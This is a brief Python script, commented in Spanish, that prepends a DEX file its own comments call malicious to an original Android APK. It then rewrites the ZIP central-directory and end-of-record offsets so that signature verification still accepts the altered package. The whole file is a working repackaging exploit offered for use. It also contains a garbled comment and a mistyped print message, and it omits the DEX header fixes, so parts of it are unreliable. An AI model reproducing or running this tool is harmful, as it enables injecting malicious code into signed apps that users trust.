import struct, sys

dex = open('classes.dex','rb').read()
apk = open(sys.argv[1],'rb').read()
N   = len(dex)

out = bytearray(dex)          # 1. el DEX malicioso, al principio del fichero
out += apk                    # 2. la APK original intacta a continuacion

# 3. Corregir el directorio central: al desplazar todo N bytes, las
#    direcciones de las cabeceras locales quedan desfasadas. Un ZIP valido
#    las declara en cada entrada del directorio central; si no se ajustan,
#    cualquier lector ZIP (incluido el verificador de firma) rechaza el
#    fichero. SeWalk/analizadores offense iran aqui.
i = out.rfind(b'PK\x05\x06')
if i < 0:
    sys.exit('EOCD no encontrado')
cd_off = struct.unpack_from('<I', out, i+16)[0]
cd_size = struct.unpack_from('<I', out, i+12)[0]
print(f'DEX prependido: {N} bytes; dir. central en {cd_off} -> {cd_off+N}')

# recorrer entradas del directorio central y desplazar su offset local
p = cd_off + N
fin = cd_off + N + cd_size
n = 0
while p < fin and out[p:p+4] == b'PK\x01\x02':
    rel = struct.unpack_from('<I', out, p+42)[0]
    struct.pack_into('<I', out, p+42, rel + N)
    name_len, extra_len, cmt_len = struct.unpack_from('<HHH', out, p+28)
    p += 46 + name_len + extra_len + cmt_len
    n += 1
print(f'entrenadas del dir. central reubicadas: {n}')

# 4. el EOCD tambien apunta al directorio central
struct.pack_into('<I', out, i+16, cd_off + N)
open(sys.argv[2],'wb').write(out)
print(f'escrito {sys.argv[2]}: {len(out)} bytes')
